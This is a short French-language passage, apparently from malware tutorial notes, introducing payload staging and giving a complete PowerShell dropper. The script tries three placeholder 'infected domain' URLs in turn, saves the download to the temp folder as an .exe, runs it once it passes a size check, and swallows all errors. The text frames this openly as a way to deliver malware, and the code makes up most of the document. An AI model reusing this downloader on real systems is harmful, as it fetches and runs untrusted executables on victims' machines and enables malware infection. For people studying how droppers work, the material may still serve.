
La plupart des malwares ne sont pas distribué en un seul fichier.

## __Download_Payload___

Afin télécharger et d'éxecuter le malware en mémoire. On va faire appelle à un domaine infecté pour télécharger notre payload.

Avec powershell ce code ressemblerai à cela :

```powershell
$wvh = new-object net.webclient;
$nsh='http://<InfectedDomain1>/trkldl@http://<InfectedDomain2>/adCa0ad@http://<InfectedDomain3>/bl4bl4c4r'.split("@");
$onj = '453';
$dxo=$env:temp+'\'+$onj+'.exe';
foreach($wzi in $nsh){
	try{
		$wvh.downloadfile($wzi, $dxo);
		if((get-item $dxo).length -ge 80000){
			invoke-item $dxo;
			break;
		}	
	}catch{}
}
```

